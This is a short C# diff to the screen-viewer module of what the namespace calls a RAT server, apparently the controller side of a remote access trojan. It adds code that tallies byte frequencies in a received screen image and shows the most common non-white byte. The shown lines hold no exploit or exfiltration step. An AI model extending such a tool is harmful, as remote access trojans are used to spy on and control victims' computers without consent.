@@ -112,13 +112,56 @@ namespace RATserverSparta.Tools.Screen
         {
             try
             {
+                // Count occurrences of each byte
+                Dictionary<byte, int> byteCounts = new Dictionary<byte, int>();
+
+                foreach (byte b in buffer)
+                {
+                    if (byteCounts.ContainsKey(b))
+                        byteCounts[b]++;
+                    else
+                        byteCounts[b] = 1;
+                }
+
+                // Find the byte that appears the most
+                byte mostCommonByte = byteCounts.OrderByDescending(x => x.Value).First().Key;
+
+                // Create the "mostbytes" string
+                string mostbytes = mostCommonByte.ToString("X2");
+
+                // If the most common byte is "FF" (white), set "mostbytes" to "FF"
+                if (mostCommonByte == 0xFF)
+                {
+                    // Check if "FF" is the only byte in the buffer
+                    if (byteCounts.Count == 1)
+                        mostbytes = "FF";
+                    else
+                    {
+                        // If "FF" is not the only byte, find the next most common byte
+                        var secondMostCommonByte = byteCounts.OrderByDescending(x => x.Value).ElementAt(1).Key;
+                        mostbytes = secondMostCommonByte.ToString("X2");
+                    }
+                }
+
+                // Use "mostbytes" as needed
+                this.Invoke((MethodInvoker)delegate
+                {
+                    this.label1.Text = mostbytes;
+                });
+            }
+            catch { }
+
+            try
+            {
                 MemoryStream imageStream = new MemoryStream(buffer);
                 Image receivedImage = Image.FromStream(imageStream);
                 pictureBox1.Image = receivedImage;
             }
             catch { }
         }
-        
+
+
+
 
         void MouseDownEvent(object sender, MouseEventArgs a)
         {
